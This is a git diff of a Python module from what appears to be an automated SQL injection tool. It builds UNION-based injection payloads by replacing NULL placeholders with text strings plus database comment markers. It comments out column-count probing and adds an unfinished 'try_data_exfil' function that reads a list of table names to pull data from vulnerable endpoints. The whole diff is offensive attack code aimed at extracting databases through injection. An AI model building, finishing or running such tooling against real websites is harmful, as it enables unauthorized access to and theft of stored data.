@@ -5,15 +5,26 @@ import string
 from bs4 import BeautifulSoup
 
 from utils.auxiliary import *
+from utils.files import *
 
 log = Auxiliary(__name__)
 log.set_config()
 
 
+def try_data_exfil(url, options: list):
+    vuln_endpoints, db_comment, num_cols, str_index = \
+        options[0], options[1], options[2], options[3]
+    file_1 = File("./utils/txt_files/tables.txt")
+    tables = file_1.open_file()
+    # for table_line in tables:
+    print(tables.readline())
+
+
 def swap_null_w_str(pld, text_str, index, options: list):
     db_comment, num_cols = options[1], options[2]
     # Stripping NULL--, adding our text string
-    str_pld = f"{pld[:-6]}'{text_str}'" + ", NULL" * (num_cols - index) + db_comment
+    str_pld = f"{pld[:-6]}'{text_str}'" + \
+        ", NULL" * (num_cols - index) + db_comment
     return str_pld
 
 
@@ -96,7 +107,8 @@ def try_null_sqli(url, options: list):
 
 
 def try_union_sqli(url, options: list):
-    options[2] = try_null_sqli(url, options)
-    if not options[2]:
-        options[2] = try_order_by_sqli(url, options)
-    find_text_cols(url, options)
+    # options[2] = try_null_sqli(url, options)
+    # if not options[2]:
+    #     options[2] = try_order_by_sqli(url, options)
+    # find_text_cols(url, options)
+    try_data_exfil(url, options)
